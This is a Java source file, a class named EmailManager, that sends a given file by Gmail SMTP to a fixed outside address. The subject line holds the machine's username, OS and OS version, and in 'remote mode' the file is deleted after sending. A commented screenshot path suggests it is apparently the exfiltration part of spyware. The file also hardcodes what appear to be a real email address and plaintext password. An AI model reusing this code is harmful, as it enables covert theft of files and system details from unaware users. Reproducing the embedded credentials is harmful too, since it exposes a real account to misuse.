package util;

import io.File;

import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.*;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import static debug.DebugSettings.debug;

public class EmailManager {

	private int MODE; 
	
	public void SendEmail(String fileAttachment) throws AddressException, MessagingException{
		debug("SendEmail()");
		
		String host = "smtp.gmail.com";//host name
		String from = "peterakos88@gmail.com";//sender id
		String to = "peter_savidis@hotmail.com";//reciever id
		String pass = "P6546334s";//sender's password 
		//String fileAttachment = "screen\\test.txt";//file name for attachment 
		
		//system properties
		Properties prop = System.getProperties();
		// Setup mail server properties
		prop.put("mail.smtp.gmail", host);
		prop.put("mail.smtp.starttls.enable", "true");
		prop.put("mail.smtp.host", host);
		prop.put("mail.smtp.user", from);
		prop.put("mail.smtp.password", pass);
		prop.put("mail.smtp.port", "587");
		prop.put("mail.smtp.auth", "true");
		
		//session 
		Session session = Session.getInstance(prop, null);
		
		// Define message
		MimeMessage message = new MimeMessage(session);
		message.setFrom(new InternetAddress(from));
		message.addRecipient(Message.RecipientType.TO,new InternetAddress(to));
		
		
		message.setSubject(SystemInformation.GetUsername()+" on "+SystemInformation.GetOS()+" version "+SystemInformation.GetOSVersion());
		
		// create the message part 
		MimeBodyPart messageBodyPart = new MimeBodyPart();
		//message body
		messageBodyPart.setText("Test");
		Multipart multipart = new MimeMultipart();
		multipart.addBodyPart(messageBodyPart);
		
		//attachment
		messageBodyPart = new MimeBodyPart();
		DataSource source = new FileDataSource(fileAttachment);
		messageBodyPart.setDataHandler(new DataHandler(source));
		messageBodyPart.setFileName(fileAttachment);
		multipart.addBodyPart(messageBodyPart);
		message.setContent(multipart);
		
		//send message to receiver
		Transport transport = session.getTransport("smtp");
		transport.connect(host, from, pass);
		transport.sendMessage(message, message.getAllRecipients());
		transport.close();

		if (MODE == MODE_REMOTE){
			debug("Remote Mode delete attachment file from disk.");
			File f = new File(fileAttachment);
			f.Delete();
		}//if remotely
		debug("SendMEmail()");
	}//SendEmail
	

	
	
	
	public void SetMode(int mode){
		if (mode == MODE_LOCAL || mode == MODE_REMOTE)
			MODE = mode;
		else
			debug("Incorrect Mode");
	}//SetMode
	
	public static int MODE_LOCAL = 5;
	public static int MODE_REMOTE = 6;
	
}//EmailManager